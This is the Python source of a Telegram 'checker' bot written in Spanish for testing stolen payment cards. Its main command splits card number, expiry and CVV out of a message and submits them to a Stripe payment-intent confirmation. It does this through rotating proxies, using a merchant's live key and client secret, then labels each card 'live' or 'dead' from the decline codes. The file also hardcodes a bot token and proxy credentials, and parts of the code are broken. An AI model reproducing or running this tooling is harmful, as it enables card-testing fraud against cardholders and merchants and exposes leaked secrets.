import logging
from logging import Handler, handlers
from multiprocessing import context
import os
from signal import Handlers
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint



from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup


##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "/.,*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", callback_data="creador")
button2 = InlineKeyboardButton(text="𝗚𝗮𝘁𝗲𝘀", callback_data="gate")
button3 = InlineKeyboardButton(text="𝐌𝐢 𝐂𝐚𝐧𝐚𝐥", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

admins = [5629056050, 5019536742]



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("☘ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 ☘: @DiegoAkk")
    if call.data == "gate":
        await call.message.answer("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: <b>Stripe Auth 1</b> | <b>Status: Off</b> ❌        
🟡 [🝂] /stp: <b>Stripe Auth 2</b> | <b>Status: Off</b> ❌
🔴 [🝂] /pene: <b>Stripe Charged 25$ Auth</b> | <b>Status: On</b> ✅    
                        
                        """)
    elif call.data == "randomvalue_of10":
        await call.message.answer("❇𝗠𝗶 𝗖𝗮𝗻𝗮𝗹 𝗲𝘀 𝗲𝘀𝘁𝗲 𝗽𝗼𝗿 𝘀𝗶 𝗾𝘂𝗶𝗲𝗿𝗲𝘀 𝗲𝗻𝘁𝗿𝗮𝗿:𝟯: @BlacKBullCanal❇")
    await call.answer()


########################## COMDANDO START ################################


@iniciar.message_handler(commands=['start'])
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/ZO72OAT', "𝑩𝒊𝒆𝒏𝒗𝒆𝒏𝒊𝒅𝒐 𝒂 𝒀𝒐𝒊𝒎𝒊𝒚𝒂𝑪𝒉𝒌𝑩𝒐𝒕, 𝒎𝒊 𝒄𝒓𝒆𝒂𝒅𝒐𝒓 𝒆𝒔 @𝑫𝒊𝒆𝒈𝒐𝑨𝑲𝑲. 𝑸𝒖𝒆 𝒍𝒂 𝒑𝒂𝒔𝒆𝒔 𝒓𝒊𝒄𝒐", "hola", reply_markup=keyboard_inline)


########################## FIN COMANDO START ################################


########################## COMANDO CMDS ################################


@iniciar.message_handler(commands=["cmds"], commands_prefix=comand)
async def cmds(message: types.Message):
    cmd = await message.reply("<b>𝕰𝖘𝖙𝖔𝖘 𝖘𝖔𝖓 𝖒𝖎𝖘 𝖈𝖔𝖒𝖆𝖓𝖉𝖔𝖘 𝖇𝖇 </b>")
    time.sleep(1)
    await cmd.edit_text("""
𝗠𝗶𝘀 𝗰𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝘀𝗼𝗻

⭕ /cmds ✅
⭕ /gates ✅
⭕ /bin ✅

                        """)
                        
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################


@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def gates(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: <b>Stripe Auth 1</b> | <b>Status: Off</b> ❌        
🟡 [🝂] /stp: <b>Stripe Auth 2</b> | <b>Status: Off</b> ❌
🔴 [🝂] /pene: <b>Stripe Charged 25$ Auth</b> | <b>Status: On</b> ✅      
                                       
                        """)
########################## FIN COMANDO GATES ################################


########################## INFO BIN ################################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>❗️ ERROR INGRESE BIEN EL BIN  ❗️</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    apis1 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis1['status']
    banke=apis1['bank']
    bank=banke['name']
    brand=apis1['brand']
    bn=apis1['query']
    typ=apis1['type']
    lv=apis1['level']
    country1=apis1['country']
    country=country1['name']
    
    
    bin2 = await bin1.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    time.sleep(1)
    bin3 = await bin2.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: {bn}
[Ϟ] <b>Vendor</b>: {brand}
[Ϟ] <b>Type</b>: {typ}
[Ϟ] <b>Level</b>: {lv}
[Ϟ] <b>Bank</b>: {bank}
[Ϟ] <b>Country</b>: {country}
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a>

""")

########################## FIN INFO BIN ################################



 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/auth '):]
    ccs1 = ccs
    if not ccs1:
        await message.reply("<b>Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>")
    
@iniciar.message_handler(commands=['stp'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('<b>Efectivamente tienes premium bb✅ | Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>')
    
    else:
        await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/stp '):]
    
    if not ccs:
        await contra.edit_text("<b>Gate Off ❌ | Reason: Me da paja arreglarlo xd</b>")



@iniciar.message_handler(commands=['pene'], commands_prefix=comand)  
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
    
    else:
        await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/pene '):]   

    if not ccs:
        await contra.edit_text("🔴 [🝂] /pene: <b>Stripe Charged 25$ Auth</b> | <b>Status: On</b> ✅")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]


    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']

    final = time.perf_counter()

    dat4 = f'receipt_email=djfjdjffj%40gmail.com&payment_method_data[type]=card&payment_method_data[billing_details][email]=djfjdjffj%40gmail.com&payment_method_data[billing_details][name]=dd&payment_method_data[billing_details][address][postal_code]=10081&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&payment_method_data[muid]=a2e62b85-15c5-4dd1-be12-03b1db1a2396be9b77&payment_method_data[sid]=0c3ac9c2-17e9-43a0-9bba-cb1174e25c5e83d67d&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&payment_method_data[time_on_page]=499164&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_DzYuDiszHWOjwN44sVfaT41s&client_secret=pi_3MbaLOJeGhFfMJgC1jwsOBWM_secret_pLuyaWQpQqSY8B7mabt9q0mTY'

    headels = {
    'authority': 'api.stripe.com',
    'method': 'POST',
    'path': '/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'es-ES,es;q=0.9',
    'content-length': '953',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    #ec-ch-ua': 'Chromium";v="110", 'Not A(Brand;v='24', 'Google Chrome';v='110',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    
    }

    session = requests.session()

    api201 = session.post("https://api.stripe.com/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm", headers=headels, data=dat4).json()
    
    ko = api201["error"]["code"]
    msgg = api201["error"]["message"]

    if 'Your card was declined.' in msgg:
        await message.reply("""
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
[🝂] 𝐂𝐂: <code>{ccs}</code> 
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱.
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
[Ϟ] 𝐁𝐢𝐧: <code>{bn}|{brand}|{typ}|{lv}</code> 
[Ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code> 
[Ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: </code>{country}</code> 
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
[Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
[Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk""")


    if 'invalid_cvc' in ko:
        await message.reply(f"""
f dd""")
          
      
    if 'invalid_expiry_year' in ko:
        await message.reply(f"""
deadpapi""")

    if 'Your card number is incorrect.' in msgg:
        await message.reply(f"""
kkk dead""")

    if 'Your card has insufficient funds.' in msgg:
        await message.reply(f"""
live""")

    else:
        await message.reply(f"""
live""")
    


    
        
   
        

print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    
